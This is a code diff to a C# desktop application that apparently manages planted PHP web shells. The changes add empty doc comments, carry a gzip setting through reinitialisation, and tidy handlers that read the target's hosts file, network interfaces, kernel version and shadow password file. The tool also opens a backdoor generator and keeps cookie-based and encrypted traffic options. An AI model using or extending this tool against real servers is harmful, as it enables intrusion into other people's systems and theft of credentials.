@@ -484,11 +484,21 @@ namespace bantam_php
             XmlHelper.SaveShells(g_OpenFileName);
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             //keep alive checks with this?
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void addToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (addClientForm == null) {
@@ -497,6 +507,11 @@ namespace bantam_php
             addClientForm.Show();
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void listviewClientsContextMenu_Paint(object sender, PaintEventArgs e)
         {
             if (validTarget()) {
@@ -518,6 +533,11 @@ namespace bantam_php
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void removeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
@@ -528,6 +548,11 @@ namespace bantam_php
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void pingToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(g_SelectedShellUrl)
@@ -540,6 +565,7 @@ namespace bantam_php
             bool sendViaCookie = Shells[shellURL].sendDataViaCookie;
             bool encryptResponse = Shells[shellURL].responseEncryption;
             int responseEncryptionMode = Shells[shellURL].responseEncryptionMode;
+            bool gzipRequest = Shells[shellURL].gzipRequestData;
 
             listViewShells.FindItemWithText(shellURL).Remove();
             Shells.Remove(shellURL);
@@ -549,10 +575,16 @@ namespace bantam_php
             Shells[shellURL].sendDataViaCookie = sendViaCookie;
             Shells[shellURL].responseEncryption = encryptResponse;
             Shells[shellURL].responseEncryptionMode = responseEncryptionMode;
+            Shells[shellURL].gzipRequestData = gzipRequest;
 
             InitializeShellData(shellURL);
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (backdoorGenerator == null) {
@@ -561,6 +593,11 @@ namespace bantam_php
             backdoorGenerator.Show();
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             SaveFileDialog saveShellsXMLDialog = new SaveFileDialog {
@@ -574,6 +611,11 @@ namespace bantam_php
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private async void openToolStripMenuItem_Click(object sender, EventArgs e)
         {
             using (var openShellXMLDialog = new OpenFileDialog {
@@ -595,7 +637,12 @@ namespace bantam_php
                 }
             }
         }
-
+        
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void editToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
@@ -608,6 +655,11 @@ namespace bantam_php
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void textBoxConsoleInput_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.Enter)
@@ -618,6 +670,11 @@ namespace bantam_php
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void txtBoxFileBrowserPath_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.Enter)
@@ -1370,8 +1427,9 @@ namespace bantam_php
         {
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFile(PhpHelper.windowsFS_hostTargets, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            string phpCode = PhpHelper.ReadFile(PhpHelper.windowsFS_hostTargets, encryptResponse);
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.windowsFS_hostTargets, encryptResponse, responseEncryptionMode);
         }
@@ -1385,8 +1443,9 @@ namespace bantam_php
         {
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_NetworkInterfaces, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_NetworkInterfaces, encryptResponse);
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_NetworkInterfaces, encryptResponse, responseEncryptionMode);
         }
@@ -1400,8 +1459,9 @@ namespace bantam_php
         {
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ProcVersion, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ProcVersion, encryptResponse);
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ProcVersion, encryptResponse, responseEncryptionMode);
         }
@@ -1415,8 +1475,9 @@ namespace bantam_php
         {
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_hostTargetsFile, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_hostTargetsFile, encryptResponse);
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_hostTargetsFile, encryptResponse, responseEncryptionMode);
         }
@@ -1430,8 +1491,9 @@ namespace bantam_php
         {
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_IssueFile, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_IssueFile, encryptResponse);
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_IssueFile, encryptResponse, responseEncryptionMode);
         }
@@ -1445,8 +1507,9 @@ namespace bantam_php
         {
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ShadowFile, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ShadowFile, encryptResponse);
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ShadowFile, encryptResponse, responseEncryptionMode);
         }
